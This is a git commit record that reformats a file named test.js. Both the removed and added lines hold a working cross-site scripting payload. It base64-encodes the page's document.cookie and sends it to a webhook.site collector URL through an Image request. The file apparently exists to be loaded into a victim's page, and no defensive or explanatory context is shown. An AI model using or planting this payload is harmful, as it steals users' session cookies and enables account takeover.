03821125f37718b3825a655e103e2c3f2a41e6fc
arete06 <63618062+arete06@users.noreply.github.com>
2025-01-23 12:12:48 +0000

    Update test.js

--- files/test.js
+++ files/test.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/711b2309-b6ee-4db4-963b-ed1661bdaab7?data='+btoa(document.cookie);
+x = new Image();
+x.src = 'https://webhook.site/711b2309-b6ee-4db4-963b-ed1661bdaab7?data='+btoa(document.cookie);
